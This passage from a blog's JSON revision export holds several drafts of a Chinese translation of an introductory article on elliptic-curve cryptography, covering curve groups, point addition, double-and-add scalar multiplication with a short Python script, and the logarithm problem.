\\\\begin{array}{rcl}\\n    m & = & \\\\frac{3x_P^2 + a}{2 y_P} = \\\\frac{3 \\\\cdot 1^2 - 7}{2 \\\\cdot 2} = -1 \\\\\\\\\\n    x_R & = & m^2 - x_P - x_Q = (-1)^2 - 1 - 1 = -1 \\\\\\\\\\n    y_R & = & y_P + m(x_R - x_P) = 2 + (-1) \\\\cdot (-1 - 1) = 4\\n\\\\end{array}\\n    $$\\n    可以得出 $P + P = -R = (-1, -4)$, <a href=\\\"https://andrea.corbellini.name/ecc/interactive/reals-add.html?px=1&py=2&qx=1&qy=2\\\">结果是正确的!</a>\\n</p>\"}],[\"markdown\",{\"markdown\":\"# 标量乘法\"}],[\"html\",{\"html\":\"<p>\\n\\t除加法外, 我们还可以定义另一种运算: <strong>标量乘法</strong>, 如下: \\n    $$ \\n    nP = \\\\underbrace{P + P + \\\\cdots + P}_{n\\\\ \\\\text{times}}\\n    $$\\n  \\t这里的 n 是一个自然数. 我也做了一个计算标量乘法的<a href=\\\"https://andrea.corbellini.name/ecc/interactive/reals-mul.html\\\">可视化工具</a>, 有兴趣的话可以看看.\\n</p>\\n\\n<p>\\n  写成上面的形式, 看起来计算 nP 需要进行 n 次加法. 当 n 是一个k位(二进制)的数字, 我们的算法复杂度将会是 $O(2^k)$, 这太差了. 但实际上我们可以有更快的算法.\\n</p>\\n\\n<p>\\n  其中一种叫做<strong>倍加法</strong>(double and add algorithm). 通过一个例子我们可以更好地解释它的原理. 当 n = 151, 表示为二进制 $10010111_2$, 借助其二进制形式我们可以用以下表达式来表示:\\n    $$\\n    \\\\begin{array}{rcl}\\n    151 & = & 1 \\\\cdot 2^7 + 0 \\\\cdot 2^6 + 0 \\\\cdot 2^5 + 1 \\\\cdot 2^4 + 0 \\\\cdot 2^3 + 1 \\\\cdot 2^2 + 1 \\\\cdot 2^1 + 1 \\\\cdot 2^0 \\\\\\\\\\n    & = & 2^7 + 2^4 + 2^2 + 2^1 + 2^0\\n\\\\end{array}\\n    $$\\n    (将n转换成二进制并表示为多个2的指数次之和)\\n    通过上面的表达式, 我们可以写出: \\n    $$\\n    151 \\\\cdot P = 2^7 P + 2^4 P + 2^2 P + 2^1 P + 2^0 P\\n    $$\\n    倍加法的具体实现步骤如下:\\n    <ul>\\n        <li> 找到点 P </li>\\n        <li> 翻倍, 得到 2P </li>\\n        <li> 用 2P 加 P (得到 $2^1P + 2^0P$ 的结果) </li>\\n        <li> 2P 翻倍, 得到 2^2P </li>\\n        <li> 将其加入之前的结果中 (得到 $2^2P + 2^1P + 2^0P$ 的结果) </li>\\n        <li> $2^2P$ 翻倍得到 $2^3P$ </li>\\n        <li> 别加$2^3P$ </li>\\n        <li> $2^3P$ 翻倍得到 $2^4P$ </li>\\n        <li> 加入之前的结果(得到 $2^4P + 2^2P + 2^1P + 2^0P$) </li>\\n        <li> ... </li>\\n    </ul>\\n最后, 只需要通过7次翻倍(自己加自己)和4次累加就可以计算出 $151 \\\\cdot P$ 的结果. 要是还说得不够清楚, 这里有一个 Python脚本实现了这个算法\\n</p>\"}],[\"markdown\",{\"markdown\":\"```python\\ndef bits(n):\\n    \\\"\\\"\\\"\\n    Generates the binary digits of n, starting\\n    from the least significant bit.\\n\\n    bits(151) -> 1, 1, 1, 0, 1, 0, 0, 1\\n    \\\"\\\"\\\"\\n    while n:\\n        yield n & 1\\n        n >>= 1\\n\\ndef double_and_add(n, x):\\n    \\\"\\\"\\\"\\n    Returns the result of n * x, computed using\\n    the double and add algorithm.\\n    \\\"\\\"\\\"\\n    result = 0\\n    addend = x\\n\\n    for bit in bits(n):\\n        if bit == 1:\\n            result += addend\\n        addend *= 2\\n\\n    return result\\n```\"}],[\"html\",{\"html\":\"<p>\\n因为翻倍和叠加都是 $O(1)$ 复杂度的运算, 那么这个算法的复杂度就是 $O(\\\\log n)$ (或者说 $O(k)$, k是数字的位长), 这样就挺好了. 至少比最开始复杂度为 $O(n)$ 的算法要好得多!\\n</p>\"}],[\"markdown\",{\"markdown\":\"# 对数\"}],[\"html\",{\"html\":\"<p>\\n已知 n 和 P, 现在我们至少有一种方法可以在多项式时间算法可以算出 $Q = nP$. 但是如果反过来会怎么样? <strong>如果我们已知 Q 和 P 想要找出 n 呢.?</strong> 这个就是所谓的 <strong>对数难题.</strong> 我们把这个问题称作\\\"对数\\\"而不是\\\"除法\\\"主要是为了和其他密码学系统在概念上保持一致(在其他密码学系统中一般用指数而不是乘法).\\n</p>\\n\\n<p>\\n    我没听说过任何\\\"简单\\\"的算法可以用于解决对数难题, 不过通过<a href=\\\"https://andrea.corbellini.name/ecc/interactive/reals-mul.html?a=-3&b=1&px=0&py=1\\\">尝试乘法</a>倒是可以找到一些规律. 比如, 已知曲线 $y^2 = x^3 - 3x + 1$ 和点 $P = (0, 1)$, 我们可以立刻验证出, 当 n 是一个奇数时,  $nP$ 会位于曲线的左侧平面, 如果 n 是一个偶数, $nP$ 会位于曲线的右侧平面. 如果我们做更多实验, 我们也许能够找出更多这样的规律, 也许可以帮助我们找到高效计算椭圆曲线上对数难题的方法.\\n</p>\\n\\n<p>\\n    不过对数难题还有一个变体: 离散对数难题. 在下一篇文章里我们将会看到, 如果我们缩小椭圆曲线的域, <strong>计算标量乘法仍然是\\\"容易的\\\", 不过求解离散对数将会成为一个\\\"十分困难\\\"的问题.</strong> 这个特性将成为椭圆曲线密码学的关键.\\n</p>\"}],[\"markdown\",{\"markdown\":\"# 下周见\"}],[\"html\",{\"html\":\"<p>\\n    这就是今天的全部内容, 希望你能喜欢这篇博客! 下周我们将会通过一些例子和小工具探索 <strong>有限域</strong> 以及 <strong>离散对数难题</strong>. 如果这些内容听起来还不错, 那么就敬请期待吧!\\n</p>\"}]],\"markups\":[],\"sections\":[[10,0],[10,1],[10,2],[10,3],[10,4],[10,5],[10,6],[10,7],[10,8],[10,9],[10,10],[10,11],[10,12],[10,13],[10,14],[10,15],[10,16],[10,17],[10,18],[10,19],[10,20],[10,21],[10,22],[10,23],[10,24],[10,25],[10,26],[10,27],[10,28],[10,29],[10,30],[10,31],[10,32],[10,33],[10,34],[10,35],[10,36],[10,37],[10,38],[10,39],[10,40],[10,41],[10,42],[10,43],[10,44],[10,45],[1,\"p\",[]]]}","created_at_ts":1577086234604,"created_at":"2019-12-23 07:30:34"},{"id":"5e006d832ee0ee00018198c5","post_id":"5dfc7ca42ee0ee000181900e","mobiledoc":"{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"html\",{\"html\":\"<script type=\\\"text/javascript\\\" async\\n  src=\\\"https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML\\\">\\n</script>\\n\\n<script type=\\\"text/x-mathjax-config\\\">\\n  MathJax.Hub.Config({tex2jax: {inlineMath: [['$','$']]}});\\n</script>\"}],[\"markdown\",{\"markdown\":\"> 本文翻译自爱尔兰AWS工程师 ANDREA CORBELLINI 关于椭圆曲线密码学四篇博客中的第一篇, 原文采用 [CC-BY 4.0 协议](https://creativecommons.org/licenses/by/4.0/deed.zh) 进行授权\\n> 原文链接 : https://andrea.corbellini.name/2015/05/17/elliptic-curve-cryptography-a-gentle-introduction/\\n> 原作者: [ANDREA CORBELLINI](https://andrea.corbellini.name/)\\n> 译者: [chxj1992](http://blog.chxj.name/)\"}],[\"markdown\",{\"markdown\":\"如果你们知道什么是椭圆曲线密码学, 那你们应该也听说过 **ECC**, **ECD**或者**ECDSA**. ECC是椭圆曲线密码学(`Elliptic Curve Cryptography`)的首字母缩写, 而另外两个都是基于ECC实现的算法.\"}],[\"markdown\",{\"markdown\":\"如今, 我们在 [TLS](https://tools.ietf.org/html/rfc4492), [PGP](https://tools.ietf.org/html/rfc6637) 和 [SSH](https://tools.ietf.org/html/rfc5656) 里都能找到椭圆曲线密码学的身影, 这三种技术可以说是现代互联网和数字世界的基础, 更别提ECC在[比特币](https://en.bitcoin.it/wiki/Secp256k1)和其他各种加密货币中发挥的巨大作用了.\"}],[\"markdown\",{\"markdown\":\"在ECC开始流行以前, 绝大多数公钥加密算法都基于 RSA, DSA 和 DH 实现. 和ECC一样, RSA等如今仍然发挥着重要的作用. RSA等算法由于其相对容易解释的原理和[可以轻松实现的简化模型](http://code.activestate.com/recipes/578838-rsa-a-simple-and-easy-to-read-implementation/), 让很多人都能大概理解RSA是怎么一回事. 而对其中大多数人来说, ECC的实现原理却仍是个谜.\"}],[\"markdown\",{\"markdown\":\"希望通过这一系列的文章我能将你带入椭圆曲线密码学的世界. 我的**目标**并不是提供一份完整详尽的ECC指南(这样的资料在网上到处都能找到), 而是通过尽量简单的方式说明 **什么是ECC以及它为什么是安全的**, 而不必在冗长的数学证明和枯燥的实现细节上花费太多的时间.另外, 我还会提供一些交互式的可视化小工具和脚本来帮助你更好的理解内容.\"}],[\"markdown\",{\"markdown\":\"具体来说, 本系列文章将涉及以下内容: \\n\\n1. [实数域上的椭圆曲线和群论](http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/) (本篇文章将会讨论)\\n2. [有限域上的椭圆曲线和离散对数难题](http://blog.chxj.name/elliptic-curve-cryptography-finite-fields-and-discrete-logarithms-zh)\\n3. [秘钥对的生成及两种ECC算法: ECDH和ECDSA](http://blog.chxj.name/elliptic-curve-cryptography-ecdh-and-ecdsa-zh)\\n4. [ECC破解算法和与RSA的对比](http://blog.chxj.name/elliptic-curve-cryptography-breaking-security-and-a-comparison-with-rsa-zh)\"}],[\"markdown\",{\"markdown\":\"为了更好的理解我们将要讨论的内容, 你需要先学习一点关于集合论, 几何学和模运算的基础, 并熟悉关于对称性和非对称密码学相关的基础知识. 最后, 你需要对什么是\\\"简单\\\"问题, 什么是\\\"复杂\\\"问题以及他们在密码学中锁扮演的角色有一个清晰的认识.\"}],[\"markdown\",{\"markdown\":\"# 椭圆曲线 \\n\\n首先, 什么是椭圆曲线? [Wolfram MathWorld](http://mathworld.wolfram.com/) 给出了一个超赞且完善的[定义](http://mathworld.wolfram.com/EllipticCurve.html). 但是考虑到本文目标,  可以把椭圆曲线简单的理解成一个满足以下方程式的点的集合: \"}],[\"html\",{\"html\":\"$$y^2 = x^3 + ax + b$$\"}],[\"html\",{\"html\":\"且满足 $4a^3 + 27b^2 \\\\ne 0$ (以便排除<a href=\\\"https://zh.wikipedia.org/wiki/%E5%A5%87%E7%82%B9_(%E6%95%B0%E5%AD%A6)\\\">奇点</a>). 上面的方程被称为椭圆曲线的维尔斯特拉斯标准形式(Weierstrass normal form).\"}],[\"image\",{\"src\":\"/content/images/2019/12/curves.png\"}],[\"html\",{\"html\":\"<pre style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n不同椭圆曲线的形状 (b=1,  a 从 2 变到 -3).\\n</pre>\"}],[\"image\",{\"src\":\"/content/images/2019/12/singularities.png\"}],[\"html\",{\"html\":\"奇点的类型: 在左图曲线上存在一个尖锐点($y^2 = x^3$), 右图曲线发生了自交($y^2 = x^3 - 3x + 2$), 它们都不是有效的椭圆曲线.\"}],[\"markdown\",{\"markdown\":\"根据a和b值的不同, 椭圆曲线可能在平面上呈现出不同的形状, 我们可以很容易的看出,椭圆曲线是关于x轴对称的. 我们还需要一个无穷远处的点(也叫理想点)作为曲线的组成部分, 从现在起, 我们将用0(数字0)表示这个点.如果要显示的表现这个无穷远处的点, 可以通过下面的方程来完善我们的定义:\"}],[\"html\",{\"html\":\"$$\\\\left\\\\{ (x, y) \\\\in \\\\mathbb{R}^2\\\\ |\\\\ y^2 = x^3 + ax + b,\\\\ 4 a^3 + 27 b^2 \\\\ne 0 \\\\right\\\\}\\\\ \\\\cup\\\\ \\\\left\\\\{ 0 \\\\right\\\\}$$\"}],[\"markdown\",{\"markdown\":\"# 群\\n\\n\"}],[\"html\",{\"html\":\"<p>\\n数学上的群是指定义了一个用\\\"+\\\"表示的二元运算\\\"加法\\\"的集合. 为了让集合 $\\\\mathbb{G}$ 成为一个群, 就必须先定义一个加法运算并且这个集合应该遵循以下四条特征: \\n</p>\\n\\n<ol>\\n  <li> <strong>封闭性:</strong> 如果a和b都是 $\\\\mathbb{G}$ 中的元素, 那么 a+b 也应该是 $\\\\mathbb{G}$ 中的元素 </li>\\n  <li> <strong>结合律:</strong> $(a + b) + c = a + (b + c)$</li>\\n  <li> 存在<strong>单位元</strong> 0 满足 $a + 0 = 0 + a = a$ </li>\\n  <li> 任何元素都有一个与之相对应的<strong>逆元</strong>, 比如: 任何元素a都存在一个b使之满足 $a + b = 0$</li>\\n</ol>\\n\\n如果我们再加上第五个条件: \\n<br>\\n<strong>交换律:</strong> $a + b = b + a$\\n<br>\\n那么这个群就可以被称作<strong>阿贝尔群</strong>\\n\\n<p>\\n    根据加法的一般概念, 整数集合 $\\\\mathbb{Z}$ 是一个群 (更准确的说, 是一个阿贝尔群). 而自然数集合就不是一个群, 因为它无法满足第四个特征.\\n</p>\\n\\n<p>\\n    群很棒因为如果我们能证明以上四条特征是成立的, 那么我们就可以自动得到群的其他一些特征. 比如: <strong>单位元是唯一的</strong>; <strong>逆元也是唯一的</strong>, 意思是: 对群中的任何元素a来说, 有且仅有b使 $a + b = 0$ 成立(也可以把b写成-a). 这些关于群的特性稍后将会直接或间接的发挥重要的作用.\\n</p>\"}],[\"html\",{\"html\":\"<a id=\\\"group-law\\\"></a>\"}],[\"markdown\",{\"markdown\":\"# 椭圆曲线上的群律\"}],[\"html\",{\"html\":\"<p>\\n    我们可以在椭圆曲线上定义一个群, 具体来说:\\n</p>\\n\\n<ul>\\n  <li>\\n    群里的元素是椭圆曲线上的点\\n  </li>\\n  <li>\\n    <strong>单位元</strong>是指在无穷远处的点 0\\n  </li>\\n  <li>\\n    点P的<strong>逆元</strong>是指其关于x轴对称的点\\n  </li>\\n  <li>\\n    <strong>加法</strong>可以根据以下规则定义: <strong>找到三个在一条线上非零的点P,Q和R, 他们之和满足 $P + Q + R = 0$</strong>\\n  </li>\\n</ul>\"}],[\"image\",{\"src\":\"/content/images/2019/12/three-aligned-points.png\"}],[\"html\",{\"html\":\"<pre style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n在一条直线上的三点之和为0\\n</pre>\"}],[\"html\",{\"html\":\"<p>\\n    注意最后一条规则, 我们只要求三个点位于一条直线上, 但是并没有要其顺序. 这意味着如果 P,Q和R在一条直线上, 则有 $P + (Q + R) = Q + (P + R) = R + (P + Q) = \\\\cdots = 0$. 这样, 我们有了一个直观的证明, <strong>我们定义的加法运算也满足结合律和交换律, 这是一个阿贝尔群.</strong>\\n</p>\\n\\n<p>\\n    到目前为止, 一切都很顺利. 但我们到底应该如何计算任意两个点之和呢?\\n</p>\"}],[\"markdown\",{\"markdown\":\"# 几何意义上的加法运算\"}],[\"html\",{\"html\":\"<p>\\n    还好这是一个阿贝尔群, 我们可以把 $P + Q + R = 0$ 写成 $P + Q = -R$. 借助这种形式的方程, 我们可以推导出一种计算P和Q之和的几何方法: <strong>过点P,Q画一条直线, 这条直线将和曲线相交于第三个点R(这意味着P,Q和R位于一条直线上). 点R的逆元-R正是 $P + Q$ 的结果</strong>.\\n</p>\"}],[\"image\",{\"src\":\"/content/images/2019/12/point-addition.png\",\"caption\":\"\"}],[\"html\",{\"html\":\"<pre style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n过 P 和 Q 画一条直线交于第三点 R, 关于x轴与之对称的点 -R 即为 P+Q 之和.\\n</pre>\"}],[\"html\",{\"html\":\"<p>\\n  如果再做一些细化, 这个几何式的方法是行得通的. 具体来说, 我们需要回答以下几个问题: \\n    \\n  <ul>\\n    <li> <strong>当 P = 0 且 Q = 0 时会怎么样?</strong> 显然我们没法画出这样的直线(因为0根本不在xy平面上), 但是根据我们对单位元 0 的定义, $P + 0 = P$ 和 $0 + Q = Q$ 对任何 P 和 Q 都成立</li>\\n    <li> <strong>当 P = -Q 时会怎么样?</strong> 在这种情况下, 穿过两点的直线将与x轴垂直且不与其他任何点相交. 但当 P 是 Q 的逆元, 根据逆元的定义则有 $P + Q = P + (-P) = 0$ </li>\\n    <li> <strong>当 P = Q 时会怎么样?</strong> 在这种情况下, 过这个点可以作出无穷多条直线. 这里问题就开始变得有点复杂了. 首先考虑当 $Q' \\\\ne P$, 而让 Q' 逐渐接近 P 时会发生什么? </li>\\n  </ul>\\n</p>\"}],[\"image\",{\"src\":\"/content/images/2019/12/animation-point-doubling.gif\",\"caption\":\"\"}],[\"html\",{\"html\":\"<pre style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n当两点逐渐靠近, 过这两个点的直线将变成曲线的一条切线\\n</pre>\"}],[\"html\",{\"html\":\"当 Q' 朝着 P 移动时, 穿过 P 和 Q' 的直线将变为曲线的一条切线. 据此我们可以得出解决 $P + P = -R$, R 是 P 点在曲线上的切线与曲线的交点.\"}],[\"html\",{\"html\":\"<p>\\n  <ul>\\n    <li> <strong> 如果 $P \\\\ne Q$, 而又不存在第三个点 R 呢?</strong> 这种情况和前一种很类似, 事实上这就是一条线经过了 P 和曲线上的一个切点 Q 的情况 </li>\\n  </ul>\\n<p>\"}],[\"image\",{\"src\":\"/content/images/2019/12/animation-tangent-line.gif\"}],[\"html\",{\"html\":\"<pre style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n如果直线与曲线只相交于两点, 这表明这条线与曲线相切. \\n很容易就能看出两点之和为切点关于x轴的对称点.\\n</pre>\"}],[\"html\",{\"html\":\"<p>\\n  假设 P 是曲线上的切点, 在前一种情况下我们用 $P + P = -Q$ 表示, 这个方程也可以写成 $P + Q = -P$. 换句话说, 现在如果 Q 是曲线上的切点, 那么上面的等式就变成了 $Q + P = -Q$.\\n</p>\\n\\n<p>\\n  现在, 几何式的方法已经可以覆盖所有的场景了, 只需要一支铅笔和一把尺子我们就能计算出如何椭圆曲线上两个点的和. 如果你有兴趣的话, <strong>也可以看看我做的这个计算椭圆曲线加法的 <a href=\\\"https://andrea.corbellini.name/ecc/interactive/reals-add.html\\\">HTML5/JavaScript版可视化工具</a> !</strong>\\n</p>\"}],[\"markdown\",{\"markdown\":\"# 代数意义上的加法运算\"}],[\"html\",{\"html\":\"<p>\\n  如果你想用计算机来算两点之和, 我们就需要将几何式的求解方法转换成代数式的方法. 把上面的求解方法翻译成一系列的方程看起来很容易, 但是因为需要求解三次方程实际上也比较枯燥. 所以在这里我会直接给出结果.\\n</p>\\n\\n<pre style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n译者注: \\n椭圆曲线加法方程的代数方法推导在 <strong> <a href=\\\"https://github.com/jimmysong/programmingbitcoin/blob/master/ch02.asciidoc#coding-point-addition\\\"> Promgramming BitCoin 的第二章 </a> </strong> \\n中给出了详细的演算过程, 有兴趣的同学可以前往阅读 \\n</pre>\\n\\n<p>\\n    首先, 我们先排除各种麻烦的边界情况. 我们已经知道 $P + (-P) = 0$, 我们也知道 $P + 0 = 0 + P = P$, 所以在我们的方程式里我们会排除这两种情况, 我们只用考虑 <strong> 两个非零点, 以及非对称点 $P = (x_P, y_P)$ 和 $Q = (x_Q, y_Q)$. </strong>\\n</p>\\n\\n<p>\\n    如果 P 和 Q 不相等 ($x_P \\\\ne x_Q$), 则过两点的直线的斜率为:\\n    $$ m = \\\\frac{y_P - y_Q}{x_P - x_Q} $$ \\n    这条直线与椭圆曲线的交点 $R = (x_R, y_R)$ 有:\\n    $$ \\n    \\\\begin{array}{rcl}\\n    x_R & = & m^2 - x_P - x_Q \\\\\\\\\\n    y_R & = & y_P + m(x_R - x_P)\\n\\t\\\\end{array} \\n    $$\\n    或者写成: \\n    $$ y_R = y_Q + m(x_R - x_Q) $$\\n    则有 $(x_P, y_P) + (x_Q, y_Q) = (x_R, -y_R)$ (注意等式中的符号并始终牢记公式 $P + Q = -R$)\\n</p>\\n\\n<p>\\n    如果想要验证结果的正确性, 我们需要检查 R 是否是曲线上的一个点, 以及 P, R 和 Q 是否在一条直线上. 验证 P, R 和 Q 在一条直线上很容易, 但是检查 R 是否是曲线上的一点就没那么容易了, 因为这又需要求解三次方程, 会比较麻烦\\n</p>\\n\\n<p>\\n    作为替代方案, 我们可以用一个<a href=\\\"https://andrea.corbellini.name/ecc/interactive/reals-add.html\\\">可视化工具</a>通过一个例子来说明. 现在有 $P = (1, 2)$ , $Q = (3, 4)$ 在曲线 $y^2 = x^3 - 7x + 10$ 上, 这两点之和为 $P + Q = -R = (-3, 2)$. 我们来看看带入方程是否成立: \\n    $$\\n    \\\\begin{array}{rcl}\\n    m & = & \\\\frac{y_P - y_Q}{x_P - x_Q} = \\\\frac{2 - 4}{1 - 3} = 1 \\\\\\\\\\n    x_R & = & m^2 - x_P - x_Q = 1^2 - 1 - 3 = -3 \\\\\\\\\\n    y_R & = & y_P + m(x_R - x_P) = 2 + 1 \\\\cdot (-3 - 1) = -2 \\\\\\\\\\n    & = & y_Q + m(x_R - x_Q) = 4 + 1 \\\\cdot (-3 - 3) = -2\\n\\\\end{array}\\n    $$\\n    很好, 结果是正确的!\\n</p>\\n\\n<p>\\n  注意, 上面的方程在 <strong>P 或者 Q 是曲线上的切点<strong>时仍然是成立的. 让我们再试试 $P = (-1, 4)$ , $Q = (1, 2)$ 的情况.\\n    $$\\n    \\\\begin{array}{rcl}\\n    m & = & \\\\frac{y_P - y_Q}{x_P - x_Q} = \\\\frac{4 - 2}{-1 - 1} = -1 \\\\\\\\\\n    x_R & = & m^2 - x_P - x_Q = (-1)^2 - (-1) - 1 = 1 \\\\\\\\\\n    y_R & = & y_P + m(x_R - x_P) = 4 + -1 \\\\cdot (1 - (-1)) = 2\\n\\\\end{array}\\n    $$\\n  我们得出 $P + Q = (1, -2)$, 这个结果和用<a href=\\\"https://andrea.corbellini.name/ecc/interactive/reals-add.html?px=-1&py=4&qx=1&qy=2\\\">可视化工具</a>算出的结果是一样的\\n</p>\\n    \\n<p>\\n    当 $P = Q$ 时, 处理起来会有点区别: 求 $x_R$ 和 $y_R$ 的方程是一样的, 不过由于 $x_P = x_Q$, 我们需要用不同的方程来计算<strong>斜率</strong>:\\n    $$ m = \\\\frac{3 x_P^2 + a}{2 y_P} $$\\n    正如我们所料, m 的表达式是如下方程的一阶导数: \\n    $$ y_P = \\\\pm \\\\sqrt{x_P^3 + ax_P + b} $$\\n    检查 R 点位于椭圆曲线上且穿过 P, R 两点的直线与曲线有且仅有两个交点就能证明结果的正确性, 但和前面一样, 我们还是通过一个例子来验证, 当 P = Q = (1, 2) 时\\n    $$\\n    \\\\begin{array}{rcl}\\n    m & = & \\\\frac{3x_P^2 + a}{2 y_P} = \\\\frac{3 \\\\cdot 1^2 - 7}{2 \\\\cdot 2} = -1 \\\\\\\\\\n    x_R & = & m^2 - x_P - x_Q = (-1)^2 - 1 - 1 = -1 \\\\\\\\\\n    y_R & = & y_P + m(x_R - x_P) = 2 + (-1) \\\\cdot (-1 - 1) = 4\\n\\\\end{array}\\n    $$\\n    可以得出 $P + P = -R = (-1, -4)$, <a href=\\\"https://andrea.corbellini.name/ecc/interactive/reals-add.html?px=1&py=2&qx=1&qy=2\\\">结果是正确的!</a>\\n</p>\"}],[\"markdown\",{\"markdown\":\"# 标量乘法\"}],[\"html\",{\"html\":\"<p>\\n\\t除加法外, 我们还可以定义另一种运算: <strong>标量乘法</strong>, 如下: \\n    $$ \\n    nP = \\\\underbrace{P + P + \\\\cdots + P}_{n\\\\ \\\\text{times}}\\n    $$\\n  \\t这里的 n 是一个自然数. 我也做了一个计算标量乘法的<a href=\\\"https://andrea.corbellini.name/ecc/interactive/reals-mul.html\\\">可视化工具</a>, 有兴趣的话可以看看.\\n</p>\\n\\n<p>\\n  写成上面的形式, 看起来计算 nP 需要进行 n 次加法. 当 n 是一个k位(二进制)的数字, 我们的算法复杂度将会是 $O(2^k)$, 这太差了. 但实际上我们可以有更快的算法.\\n</p>\\n\\n<p>\\n  其中一种叫做<strong>倍加法</strong>(double and add algorithm). 通过一个例子我们可以更好地解释它的原理. 当 n = 151, 表示为二进制 $10010111_2$, 借助其二进制形式我们可以用以下表达式来表示:\\n    $$\\n    \\\\begin{array}{rcl}\\n    151 & = & 1 \\\\cdot 2^7 + 0 \\\\cdot 2^6 + 0 \\\\cdot 2^5 + 1 \\\\cdot 2^4 + 0 \\\\cdot 2^3 + 1 \\\\cdot 2^2 + 1 \\\\cdot 2^1 + 1 \\\\cdot 2^0 \\\\\\\\\\n    & = & 2^7 + 2^4 + 2^2 + 2^1 + 2^0\\n\\\\end{array}\\n    $$\\n    (将n转换成二进制并表示为多个2的指数次之和)\\n    通过上面的表达式, 我们可以写出: \\n    $$\\n    151 \\\\cdot P = 2^7 P + 2^4 P + 2^2 P + 2^1 P + 2^0 P\\n    $$\\n    倍加法的具体实现步骤如下:\\n    <ul>\\n        <li> 找到点 P </li>\\n        <li> 翻倍, 得到 2P </li>\\n        <li> 用 2P 加 P (得到 $2^1P + 2^0P$ 的结果) </li>\\n        <li> 2P 翻倍, 得到 2^2P </li>\\n        <li> 将其加入之前的结果中 (得到 $2^2P + 2^1P + 2^0P$ 的结果) </li>\\n        <li> $2^2P$ 翻倍得到 $2^3P$ </li>\\n        <li> 别加$2^3P$ </li>\\n        <li> $2^3P$ 翻倍得到 $2^4P$ </li>\\n        <li> 加入之前的结果(得到 $2^4P + 2^2P + 2^1P + 2^0P$) </li>\\n        <li> ... </li>\\n    </ul>\\n最后, 只需要通过7次翻倍(自己加自己)和4次累加就可以计算出 $151 \\\\cdot P$ 的结果. 要是还说得不够清楚, 这里有一个 Python脚本实现了这个算法\\n</p>\"}],[\"markdown\",{\"markdown\":\"```python\\ndef bits(n):\\n    \\\"\\\"\\\"\\n    Generates the binary digits of n, starting\\n    from the least significant bit.\\n\\n    bits(151) -> 1, 1, 1, 0, 1, 0, 0, 1\\n    \\\"\\\"\\\"\\n    while n:\\n        yield n & 1\\n        n >>= 1\\n\\ndef double_and_add(n, x):\\n    \\\"\\\"\\\"\\n    Returns the result of n * x, computed using\\n    the double and add algorithm.\\n    \\\"\\\"\\\"\\n    result = 0\\n    addend = x\\n\\n    for bit in bits(n):\\n        if bit == 1:\\n            result += addend\\n        addend *= 2\\n\\n    return result\\n```\"}],[\"html\",{\"html\":\"<p>\\n因为翻倍和叠加都是 $O(1)$ 复杂度的运算, 那么这个算法的复杂度就是 $O(\\\\log n)$ (或者说 $O(k)$, k是数字的位长), 这样就挺好了. 至少比最开始复杂度为 $O(n)$ 的算法要好得多!\\n</p>\"}],[\"markdown\",{\"markdown\":\"# 对数\"}],[\"html\",{\"html\":\"<p>\\n已知 n 和 P, 现在我们至少有一种方法可以在多项式时间算法可以算出 $Q = nP$. 但是如果反过来会怎么样? <strong>如果我们已知 Q 和 P 想要找出 n 呢.?</strong> 这个就是所谓的 <strong>对数难题.</strong> 我们把这个问题称作\\\"对数\\\"而不是\\\"除法\\\"主要是为了和其他密码学系统在概念上保持一致(在其他密码学系统中一般用指数而不是乘法).\\n</p>\\n\\n<p>\\n    我没听说过任何\\\"简单\\\"的算法可以用于解决对数难题, 不过通过<a href=\\\"https://andrea.corbellini.name/ecc/interactive/reals-mul.html?a=-3&b=1&px=0&py=1\\\">尝试乘法</a>倒是可以找到一些规律. 比如, 已知曲线 $y^2 = x^3 - 3x + 1$ 和点 $P = (0, 1)$, 我们可以立刻验证出, 当 n 是一个奇数时,  $nP$ 会位于曲线的左侧平面, 如果 n 是一个偶数, $nP$ 会位于曲线的右侧平面. 如果我们做更多实验, 我们也许能够找出更多这样的规律, 也许可以帮助我们找到高效计算椭圆曲线上对数难题的方法.\\n</p>\\n\\n<p>\\n    不过对数难题还有一个变体: 离散对数难题. 在下一篇文章里我们将会看到, 如果我们缩小椭圆曲线的域, <strong>计算标量乘法仍然是\\\"容易的\\\", 不过求解离散对数将会成为一个\\\"十分困难\\\"的问题.</strong> 这个特性将成为椭圆曲线密码学的关键.\\n</p>\"}],[\"markdown\",{\"markdown\":\"# 下周见\"}],[\"html\",{\"html\":\"<p>\\n    这就是今天的全部内容, 希望你能喜欢这篇博客! 下周我们将会通过一些例子和小工具探索 <strong>有限域</strong> 以及 <strong>离散对数难题</strong>. 如果这些内容听起来还不错, 那么就敬请期待吧!\\n</p>\"}]],\"markups\":[],\"sections\":[[10,0],[10,1],[10,2],[10,3],[10,4],[10,5],[10,6],[10,7],[10,8],[10,9],[10,10],[10,11],[10,12],[10,13],[10,14],[10,15],[10,16],[10,17],[10,18],[10,19],[10,20],[1,\"p\",[]],[10,21],[10,22],[10,23],[10,24],[10,25],[10,26],[10,27],[10,28],[10,29],[10,30],[10,31],[10,32],[10,33],[10,34],[10,35],[10,36],[10,37],[10,38],[10,39],[10,40],[10,41],[10,42],[10,43],[10,44],[10,45],[10,46],[1,\"p\",[]]]}","created_at_ts":1577086339168,"created_at":"2019-12-23 07:32:19"},{"id":"5e006e1e2ee0ee00018198d1","post_id":"5dfc7ca42ee0ee000181900e","mobiledoc":"{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"html\",{\"html\":\"<script type=\\\"text/javascript\\\" async\\n  src=\\\"https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML\\\">\\n</script>\\n\\n<script type=\\\"text/x-mathjax-config\\\">\\n  MathJax.Hub.Config({tex2jax: {inlineMath: [['$','$']]}});\\n</script>\"}],[\"markdown\",{\"markdown\":\"> 本文翻译自爱尔兰AWS工程师 ANDREA CORBELLINI 关于椭圆曲线密码学四篇博客中的第一篇, 原文采用 [CC-BY 4.0 协议](https://creativecommons.org/licenses/by/4.0/deed.zh) 进行授权\\n> 原文链接 : https://andrea.corbellini.name/2015/05/17/elliptic-curve-cryptography-a-gentle-introduction/\\n> 原作者: [ANDREA CORBELLINI](https://andrea.corbellini.name/)\\n> 译者: 